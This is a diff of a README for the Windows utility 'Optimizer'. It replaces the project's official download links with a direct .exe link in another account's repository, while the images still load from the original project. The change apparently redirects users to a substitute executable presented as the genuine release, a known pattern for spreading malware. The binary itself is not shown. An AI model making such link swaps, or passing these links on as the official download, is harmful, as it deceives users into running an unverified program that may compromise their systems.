@@ -3,7 +3,7 @@
 </p> 
 
 <p align="center">
-	<a href="https://github.com/hellzerg/optimizer/releases/download/14.5/Optimizer-14.5.exe" target="_blank">
+	<a href="https://github.com/vinilolah09/Bes-Optimizer/releases/download/14.5/Optimizer-14.5.exe" target="_blank">
 		<img src="https://raw.githubusercontent.com/hellzerg/optimizer/master/download-button.png">
 		<br>
 		<img src="https://raw.githubusercontent.com/hellzerg/optimizer/master/flags.png">
@@ -41,7 +41,7 @@ Depending on your version of Windows, Optimizer will also allow you to perform s
 <hr>
 
 ### ⬇️ Downloads: ###
-https://github.com/hellzerg/optimizer/releases
+https://github.com/vinilolah09/Bes-Optimizer/releases/download/14.5/Optimizer-14.5.exe
 
 <hr>
 
